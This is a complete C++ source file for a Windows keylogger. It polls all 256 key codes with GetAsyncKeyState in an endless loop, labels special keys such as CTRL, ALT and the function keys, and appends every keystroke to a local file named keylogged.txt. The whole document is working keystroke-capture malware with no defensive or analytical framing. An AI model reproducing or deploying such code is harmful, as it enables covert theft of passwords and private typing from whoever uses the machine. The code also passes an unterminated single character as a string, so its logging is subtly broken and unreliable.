#include <iostream>
#include <fstream>
#include <windows.h>

void LogKeysToFile(const char *key)
{
    std::ofstream log("keylogged.txt", std::fstream::app);
    if (log.is_open())
    {
        log << key;
    }
}

const char *OurSpecialKeys(const char VK)
{
    switch(VK)
    {
        case VK_SHIFT: return "[SHIFT]";
        case VK_RETURN: return "[RETURN]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_CLEAR: return "[CLEAR]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_F1 ... VK_F12:
            static char funckey[5];
            sprintf(funckey, "[F%d]", VK - VK_F1 + 1);
            return funckey; 
        default:return nullptr;
        
    }
}

int main()
{
    bool getprevkeys[256] = {false};
    std::cout << "Keylogger Initialized!\n";
    while (true)
    {
        for (int i=0; i<=255; i++)
        {
            bool ifpressed = (GetAsyncKeyState(i) & 0x8000) != 0;

            if (ifpressed && !getprevkeys[i])
            {
                const char *mykey = OurSpecialKeys(i);
                // if (mykey) std::cout << mykey;
                if (mykey) LogKeysToFile(mykey);
                // *mykey prints only [ because it holds the address of first element.
                // else if (isprint(i)) std::cout << char(i);
                else if (isprint(i)){
                    char c = static_cast<char>(i);
                    LogKeysToFile(&c);
                }
            }

            getprevkeys[i] = ifpressed;
        }
    }

    return 0;
}